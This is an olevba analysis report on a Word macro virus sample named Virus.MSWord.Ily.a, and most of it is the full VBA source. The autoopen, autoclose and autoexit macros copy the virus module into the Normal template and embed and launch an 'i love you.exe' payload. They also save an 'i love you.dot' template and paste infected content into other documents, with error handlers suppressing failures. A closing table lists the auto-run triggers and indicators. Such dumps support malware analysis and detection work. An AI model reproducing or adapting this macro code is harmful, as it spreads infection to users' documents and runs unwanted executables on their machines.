olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Ily.a-d1c7ed6662a1f5e53f4dbc26ba8f46fc16c092a8
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Ily.a-d1c7ed6662a1f5e53f4dbc26ba8f46fc16c092a8 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO ily.bas 
in file: Virus.MSWord.Ily.a-d1c7ed6662a1f5e53f4dbc26ba8f46fc16c092a8 - OLE stream: 'Macros/VBA/ily'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Public biaosi As String
Public danqian As String
Public biaosi1 As String

Sub autoopen()
Dim fso, dirwin, dirsystem, dirtemp, winnormal
Set fso = CreateObject("scripting.filesystemobject")
Set dirwin = fso.getspecialfolder(0)
Set dirsystem = fso.getspecialfolder(1)
Set dirtemp = fso.getspecialfolder(2)
'winnormal = Left$(dirtemp, (Len(dirtemp) - 13)) + "Application Data\Microsoft\Templates"


biaosi = ActiveDocument.Name
If biaosi <> "i love you.dot" Then
danqian = ActiveDocument.Path + "\" + ActiveDocument.Name
On Error GoTo mathhandler
Application.OrganizerCopy Source:= _
        danqian, Destination _
        := _
       NormalTemplate.FullName _
        , Name:="ily", Object:=wdOrganizerObjectProjectItems

Selection.InlineShapes.AddOLEObject ClassType:="Package", FileName:= _
       dirwin & "\i love you.exe", LinkToFile:=False, DisplayAsIcon:=False
     
If misflag <> 1 Then
Selection.MoveLeft Unit:=wdCharacter, Count:=1, Extend:=wdExtend
    Selection.Cut
    Selection.WholeStory
    Selection.Delete Unit:=wdCharacter, Count:=1
    Selection.Paste
    ActiveDocument.SaveAs FileName:=dirwin & "\i love you.dot", FileFormat:=wdFormatTemplate _
        , LockComments:=False, Password:="", AddToRecentFiles:=True, _
        WritePassword:="", ReadOnlyRecommended:=False, EmbedTrueTypeFonts:=False, _
         SaveNativePictureFormat:=False, SaveFormsData:=False, SaveAsAOCELetter:= _
        False
    Documents.Open FileName:=danqian, ConfirmConversions:=True, _
        ReadOnly:=False, AddToRecentFiles:=False, PasswordDocument:="", _
        PasswordTemplate:="", Revert:=False, WritePasswordDocument:="", _
        WritePasswordTemplate:="", Format:=wdOpenFormatAuto
    'Documents("C:\winnt\i love you.dot").Save
    Windows("i love you.dot").Close
flag1 = 1
Else
End If

If flag1 <> 1 Then
Documents.Open FileName:=dirwin & "\i love you.dot", ConfirmConversions:=True, _
        ReadOnly:=False, AddToRecentFiles:=False, PasswordDocument:="", _
        PasswordTemplate:="", Revert:=False, WritePasswordDocument:="", _
        WritePasswordTemplate:="", Format:=wdOpenFormatAuto
Application.OrganizerCopy Source:= _
        dirwin & "\i love you.dot" _
        , Destination:=danqian _
        , Name:="ily", Object:=wdOrganizerObjectProjectItems

Selection.MoveRight Unit:=wdCharacter, Count:=1, Extend:=wdExtend
    Selection.Copy
    'Documents("C:\winnt\i love you.dot").Save
    Windows("i love you.dot").Close
    Selection.Paste
    ActiveDocument.Save
    Application.WindowState = wdWindowStateNormal
Else
End If

mathhandler:
misflag = 1
Resume Next
 

Else
End If




End Sub

Sub autoclose()
Dim fso, dirwin, dirsystem, dirtemp, winnormal
Set fso = CreateObject("scripting.filesystemobject")
Set dirwin = fso.getspecialfolder(0)
Set dirsystem = fso.getspecialfolder(1)
Set dirtemp = fso.getspecialfolder(2)
winnormal = Left$(dirtemp, (Len(dirtemp) - 13)) + "Application Data\Microsoft\Templates"

On Error GoTo mathhandler2
biaosi1 = ActiveDocument.Name
If biaosi1 <> "i love you.dot" Then
Documents.Open FileName:=dirwin & "\i love you.dot", ConfirmConversions:=True, _
        ReadOnly:=False, AddToRecentFiles:=False, PasswordDocument:="", _
        PasswordTemplate:="", Revert:=False, WritePasswordDocument:="", _
        WritePasswordTemplate:="", Format:=wdOpenFormatAuto
Selection.MoveRight Unit:=wdCharacter, Count:=1, Extend:=wdExtend
    Selection.Copy
    Windows("i love you.dot").Close
Documents(biaosi1).Activate
With ActiveDocument
Selection.HomeKey Unit:=wdStory
     Selection.Paste
Selection.EndKey Unit:=wdStory
Selection.Paste
End With
    ActiveDocument.Save
    Application.WindowState = wdWindowStateNormal
Else
End If
mathhandler2:
Resume Next
End Sub


Sub autoexit()
Dim fso, dirwin, dirsystem, dirtemp, winnormal
Set fso = CreateObject("scripting.filesystemobject")
Set dirwin = fso.getspecialfolder(0)
Set dirsystem = fso.getspecialfolder(1)
Set dirtemp = fso.getspecialfolder(2)
winnormal = Left$(dirtemp, (Len(dirtemp) - 13)) + "Application Data\Microsoft\Templates"

On Error GoTo mathhandler1
Documents.Open FileName:=dirwin & "\i love you.dot", ConfirmConversions:=True, _
        ReadOnly:=False, AddToRecentFiles:=False, PasswordDocument:="", _
        PasswordTemplate:="", Revert:=False, WritePasswordDocument:="", _
        WritePasswordTemplate:="", Format:=wdOpenFormatAuto
Selection.MoveRight Unit:=wdCharacter, Count:=1, Extend:=wdExtend
Selection.InlineShapes(1).OLEFormat.DoVerb VerbIndex:=wdOLEVerbPrimary
'Documents("C:\winnt\i love you.dot").Save
mathhandler1:
Resume Next
'Windows("i love you.dot").Close
End Sub









+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |autoopen            |Runs when the Word document is opened        |
|AutoExec  |autoexit            |Runs when the Word document is closed        |
|AutoExec  |autoclose           |Runs when the Word document is closed        |
|Suspicious|Open                |May open a file                              |
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|IOC       |you.exe             |Executable file name                         |
+----------+--------------------+---------------------------------------------+

